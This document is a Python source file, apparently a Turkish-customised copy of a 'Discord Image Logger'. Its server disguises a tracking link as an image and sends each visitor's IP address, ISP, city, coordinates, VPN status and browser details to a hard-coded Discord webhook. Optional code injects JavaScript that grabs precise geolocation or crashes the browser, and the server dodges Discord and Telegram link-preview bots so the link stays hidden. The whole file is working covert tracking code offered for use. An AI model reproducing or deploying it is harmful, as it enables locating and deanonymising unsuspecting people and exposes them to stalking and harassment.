# Discord Image Logger

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "oylesine bi image logger"
__version__ = "v2.0"
__author__ = "cabdio"

config = {
    "webhook": "https://discord.com/api/webhooks/1406755079599554665/DH236R4M4voXYby7m2qDwAtiFbGD5PvjrdcLIxV7lKuPQ7asa83gtfUdFDTLYGNq1mv9",
    "image": "data:image/jpeg;base64,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", 
    "imageArgument": True,

    "username": "CABDIOLOGGER", 
    "color": 0x00FFFF,

    "crashBrowser": False, 
    "accurateLocation": False,

    "message": {
        "doMessage": False, 
        "message": "cabdio buradaydı :)",
        "richMessage": True,
    },

    "vpnCheck": 1,
                # 0 = VPN kontrolünü kapat
                # 1 = VPN tespit edildiği zaman beni etiketleme
                # 2 = VPN tespit edildiği zaman bildirme

    "linkAlerts": False, 
    "buggedImage": True,

    "antiBot": 1,
    

    "redirect": {
        "redirect": False,
        "page": "https://example.org"
    },


}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Hata!",
            "color": config["color"],
            "description": f"IP adresi LOG'lanırken bir hata oluştu!\n\n**Hata:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Bağlantı Gönderildi",
            "color": config["color"],
            "description": f"IPLogger bağlantısı bir sohbete gönderildi!\nBirisi tıkladığında bilgilendirileceksiniz.\n\n**Bitiş Noktası:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - Birisi Tıkladı!",
            "color": config["color"],
            "description": f"""**Bir kullanıcı orijinal resmi fotoğrafı açtı**

**Bitiş Noktası:** `{endpoint}`
            
**IP Adresi:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Sağlayıcı:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Ülke:** `{info['country'] if info['country'] else 'Unknown'}`
> **Bölge:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **Şehir:** `{info['city'] if info['city'] else 'Unknown'}`
> **Koordinat:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Saat Dilimi:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobil:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**Bilgisayar Bilgileri:**
> **İşletim Sistemi:** `{os}`
> **Tarayıcı:** `{browser}`

**Aracı:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

}

# By DeKrypt | https://github.com/dekrypted

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
